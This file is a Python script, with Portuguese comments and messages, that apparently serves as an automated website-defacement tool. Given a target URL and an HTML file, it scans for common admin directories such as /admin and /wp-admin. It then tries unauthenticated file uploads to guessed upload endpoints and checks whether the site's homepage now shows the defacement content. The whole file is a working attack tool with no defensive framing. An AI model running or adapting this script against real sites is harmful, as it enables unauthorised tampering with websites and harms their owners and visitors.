#!/usr/bin/env python3
import requests
from urllib.parse import urlparse
import argparse
import re
import sys
import time

class DefaceExploit:
    def __init__(self, target_url, deface_file):
        self.target = target_url
        self.deface_file = deface_file
        self.session = requests.Session()
        self.base_url = self._get_base_url(target_url)
        
    def _get_base_url(self, url):
        parsed = urlparse(url)
        return f"{parsed.scheme}://{parsed.netloc}"
    
    def scan_directories(self):
        print("[*] Iniciando varredura de diretórios...")
        common_dirs = [
            "/admin", "/wp-admin", "/admin123", "/administrator",
            "/login", "/wp-login", "/admin/login", "/manager",
            "/panel", "/adminpanel", "/backoffice", "/cms",
            "/config", "/setup", "/install", "/upgrade",
            "/backup", "/test", "/dev", "/staging"
        ]
        
        found_dirs = []
        for directory in common_dirs:
            url = f"{self.base_url}{directory}"
            try:
                response = self.session.get(url, timeout=5)
                if response.status_code < 400:
                    print(f"[+] Diretório encontrado: {url}")
                    found_dirs.append(url)
                    
                    # Testar upload se for diretório admin
                    if any(word in directory.lower() for word in ["admin", "wp", "login"]):
                        self.test_upload(url)
                        
            except requests.exceptions.RequestException:
                pass
                
        return found_dirs
    
    def test_upload(self, admin_url):
        print(f"[*] Testando upload em: {admin_url}")
        upload_paths = [
            "/upload", "/file-upload", "/upload-file",
            "/media/upload", "/assets/upload", "/images/upload"
        ]
        
        for path in upload_paths:
            full_url = f"{admin_url}{path}"
            try:
                files = {'file': open(self.deface_file, 'rb')}
                response = self.session.post(full_url, files=files, timeout=10)
                
                if response.status_code < 400:
                    print(f"[+] Upload bem-sucedido em: {full_url}")
                    self.check_deface(admin_url)
                    return True
            except requests.exceptions.RequestException:
                pass
                
        return False
    
    def check_deface(self, admin_url):
        print("[*] Verificando deface...")
        paths = ["/", "/index.html", "/index.htm"]
        
        for path in paths:
            full_url = f"{self.base_url}{path}"
            try:
                response = self.session.get(full_url, timeout=5)
                if response.status_code < 400:
                    content = response.text.lower()
                    with open(self.deface_file, 'r') as f:
                        deface_content = f.read().lower()
                        
                    if deface_content in content:
                        print(f"[+] Deface confirmado em: {full_url}")
                        return True
            except requests.exceptions.RequestException:
                continue
                
        print("[-] Deface não confirmado")
        return False
    
    def run(self):
        print(f"[*] Explorando site: {self.target}")
        directories = self.scan_directories()
        
        if not directories:
            print("[-] Nenhum diretório administrativo encontrado")
            return False
            
        return True

def main():
    parser = argparse.ArgumentParser(description="Deface Automático")
    parser.add_argument("-t", "--target", required=True, help="URL alvo")
    parser.add_argument("-d", "--deface", required=True, help="Arquivo HTML para deface")
    args = parser.parse_args()
    
    exploit = DefaceExploit(args.target, args.deface)
    exploit.run()

if __name__ == "__main__":
    main()